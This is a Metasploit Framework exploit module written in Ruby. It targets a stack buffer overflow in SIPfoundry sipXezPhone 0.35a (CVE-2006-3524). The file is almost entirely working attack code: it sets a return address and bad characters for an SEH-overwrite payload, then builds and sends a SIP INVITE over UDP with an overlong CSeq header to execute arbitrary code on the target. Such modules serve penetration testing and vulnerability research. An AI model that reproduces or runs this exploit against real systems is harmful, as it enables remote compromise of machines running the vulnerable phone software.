##
# $Id: sipxezphone_cseq.rb 9525 2010-06-15 07:18:08Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Udp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SIPfoundry sipXezPhone 0.35a CSeq Field Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in SIPfoundry's
				sipXezPhone version 0.35a. By sending an long CSeq header,
				a remote attacker could overflow a buffer and execute
				arbitrary code on the system with the privileges of
				the affected application.
			},
			'Author'         => 'MC',
			'Version'        => '$Revision: 9525 $',
			'References'     =>
				[
					['CVE', '2006-3524'],
					['OSVDB', '27122'],
					['BID', '18906'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 400,
					'BadChars' => "\x00\x0a\x20\x09\x0d",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',

			'Targets'        =>
				[
					['sipXezPhone 0.35a Universal', { 'Ret' => 0x1008e853 } ],
				],

			'Privileged'     => false,

			'DisclosureDate' => 'Jul 10 2006',

			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(5060)
			], self.class)
	end

	def exploit
		connect_udp

		print_status("Trying target #{target.name}...")

		user   = rand_text_english(2, payload_badchars)
		port   = rand(65535).to_s
		filler = rand_text_english(260, payload_badchars)
		seh    = generate_seh_payload(target.ret)
		filler[252, seh.length] = seh

		sploit  =   "INVITE sip:#{user}\@127.0.0.1 SIP/2.0" + "\r\n"
		sploit  <<  "To: <sip:#{rhost}:#{rport}>" + "\r\n"
		sploit  <<  "Via: SIP/2.0/UDP #{rhost}:#{port}" + "\r\n"
		sploit  <<  "From: \"#{user}\"<sip:#{rhost}:#{port}>" + "\r\n"
		sploit  <<  "Call-ID: #{(rand(100)+100)}#{rhost}" + "\r\n"
		sploit  <<  "CSeq: " + filler + "\r\n"
		sploit  <<  "Max-Forwards: 20" +  "\r\n"
		sploit  <<  "Contact: <sip:127.0.0.1:#{port}>" + "\r\n\r\n"

		udp_sock.put(sploit)

		handler
		disconnect_udp
	end

end
